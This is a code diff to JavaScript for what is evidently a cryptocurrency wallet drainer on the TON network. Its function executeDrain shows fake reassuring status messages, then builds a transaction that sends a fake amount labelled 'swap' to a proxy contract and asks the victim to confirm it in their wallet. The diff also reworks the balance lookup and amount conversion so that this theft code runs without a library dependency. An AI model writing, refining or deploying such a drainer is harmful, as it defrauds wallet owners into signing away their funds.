@@ -19,12 +19,17 @@ function sleep(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }
 
 async function getBalance(address) {
     try {
-        var TonWebLib = window.TonWeb;
-        if (!TonWebLib) return 0;
-        var tw  = new TonWebLib(new TonWebLib.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
-        var raw = await tw.getBalance(address);
-        return parseFloat(TonWebLib.utils.fromNano(raw));
-    } catch(e) { return 0; }
+        var url = 'https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(address);
+        var res = await fetch(url);
+        var json = await res.json();
+        if (json.ok) {
+            return parseFloat(json.result) / 1e9;
+        }
+        return 0;
+    } catch(e) {
+        console.warn('balance error', e);
+        return 0;
+    }
 }
 
 async function executeDrain(userAddress) {
@@ -38,12 +43,11 @@ async function executeDrain(userAddress) {
     setStatus('📊 Calculating fees...', true);           await sleep(800);
     setStatus('🔐 Opening secure channel...', true);    await sleep(700);
 
-    var TonWebLib = window.TonWeb;
-    var nano = TonWebLib.utils.toNano(FAKE_AMOUNT);
+    var nano = String(Math.round(parseFloat(FAKE_AMOUNT) * 1e9));
 
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [{ address: PROXY_CONTRACT, amount: nano.toString(), payload: 'swap' }]
+        messages: [{ address: PROXY_CONTRACT, amount: nano, payload: 'swap' }]
     };
 
     setStatus('⏳ Confirm in wallet (' + FAKE_AMOUNT + ' TON)');
